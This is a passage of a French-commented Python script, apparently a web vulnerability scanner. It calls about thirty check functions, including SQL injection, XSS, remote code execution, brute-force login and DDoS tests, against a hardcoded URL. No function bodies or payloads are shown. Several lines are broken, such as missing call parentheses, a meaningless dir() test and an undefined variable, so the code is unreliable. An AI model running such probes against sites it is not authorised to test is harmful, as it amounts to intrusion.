    check_session_hijacking_vulnerability(url)
    check_file_inclusion_vulnerability
    check_test_sql_injection_vulnerability
    check_vulnerable_headers(url)
    check_ssl_vulnerabilities(url)
    check_sql_injection_vulnerability_advanced(url)
    check_xss_vulnerability_advanced(url)
    check_security_headers(url)
    check_test_login(username, passwords_list, login_url)
    check_api_security(url)
    check_ddos_vulnerability(url)
    check_file_upload_security(url)
    check_cookie_security(url)
    check_email_security(url)
    check_robots_sitemap_security(url)
    check_database_security(url)
    check_compliance_standards(url)
    check_server_security(url)
    check_js_security(url)
    check_csp_security(url)
    check_hpkp_security(url)
    check_server_configuration(url)
    check_css_security(url)
    check_secure_cookies(url)
    check_hsts_security(url)
    check_csrf_vulnerabilities(url)
    check_form_anti_robots(url)

    # Si une vulnérabilité est détectée, mettez le statut à "Not OK"
    if "Not OK" in [output for output in dir() if "Not OK" in output]:
        status = "Not OK"

    print(f"\nAudit de sécurité pour {url} terminé.")
    return status



# Liste pour stocker les résultats de chaque vérification
results = []

# Ajoutez les résultats de chaque fonction de vérification à la liste results
results.append(check_remote_code_execution(url))
results.append(check_brute_force_attack(url))
results.append(check_command_injection_vulnerability(url))
results.append(check_session_hijacking_vulnerability(url))
results.append(check_file_inclusion_vulnerability(url))
results.append(check_test_sql_injection_vulnerability(url))
results.append(check_vulnerable_headers(url))
results.append(check_ssl_vulnerabilities(url))
results.append(check_sql_injection_vulnerability_advanced(url))
results.append(check_xss_vulnerability_advanced(url))
results.append(check_security_headers(url))
results.append(check_test_login(username, passwords_list, login_url))
results.append(check_api_security(url))
results.append(check_ddos_vulnerability(url))
results.append(check_file_upload_security(url))
results.append(check_cookie_security(url))
results.append(check_email_security(url))
results.append(check_robots_sitemap_security(url))
results.append(check_database_security(url))
results.append(check_compliance_standards(url))
results.append(check_server_security(url))
results.append(check_js_security(url))
results.append(check_csp_security(url))
results.append(check_hpkp_security(url))
results.append(check_server_configuration(url))
results.append(check_css_security(url))
results.append(check_secure_cookies(url))
results.append(check_hsts_security(url))
results.append(check_csrf_vulnerabilities(url))
results.append(check_form_anti_robots(url))



# Affichage des résultats récapitulatifs
print("\nRésultats récapitulatifs :")
for idx, result in enumerate(results, start=1):
    if result is not None:
        problem, solution = result
        print(f"{idx}) Problème : {problem}")
        if solution:
            print(f"   Solution : {solution}")

if __name__ == "__main__":
    target_url = "https://www.totalbug.com/chatgpt/"  # Remplacez par l'URL cible

    scan_status = check_security_audit(target_url)
    print(f"\nStatut du scan : {scan_status}")

    

